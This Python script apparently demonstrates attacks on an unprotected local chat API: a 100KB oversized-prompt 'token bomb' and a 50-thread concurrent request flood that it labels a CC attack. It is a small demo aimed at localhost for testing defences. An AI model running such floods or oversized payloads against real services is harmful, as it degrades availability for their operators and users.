import requests
import threading
import time
import sys

# 攻击目标
URL = "http://127.0.0.1:8000/api/chat"


def attack_token_bomb():
    """攻击 A：发送超长 Token 炸弹"""
    print("💣 [攻击A] 正在发送 100KB 超长 Token 炸弹...")
    payload = {"prompt": "请帮我总结这段话：" + "A" * 100000}
    try:
        r = requests.post(URL, json=payload, timeout=30)
        print(f"💥 [攻击A] 服务器返回状态码：{r.status_code}，耗时：{r.elapsed.total_seconds()}秒")
        print(f"💥 [攻击A] 响应内容片段：{r.text[:100]}...")
    except Exception as e:
        print(f"💥 [攻击A] 攻击失败：{e}")


def attack_cc():
    """攻击 B：高并发 CC 攻击"""
    print("\n💣 [攻击B] 正在发起 50 个并发请求（模拟 CC 攻击）...")
    start_time = time.time()

    def send_request(i):
        try:
            r = requests.post(URL, json={"prompt": f"并发请求 {i}：请回复一个数字。"}, timeout=15)
            print(f"  -> 请求 {i} 完成，状态码: {r.status_code}")
        except Exception as e:
            print(f"  -> 请求 {i} 失败: {e}")

    threads = []
    for i in range(50):
        t = threading.Thread(target=send_request, args=(i,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    elapsed = time.time() - start_time
    print(f"💥 [攻击B] 50 个并发请求完成，总耗时：{elapsed:.2f}秒")


if __name__ == "__main__":
    print("================ 开始攻击未设防的 API ================\n")
    attack_token_bomb()
    time.sleep(2)  # 等前一个攻击稍微缓一缓
    attack_cc()
    print("\n================ 攻击结束 ================")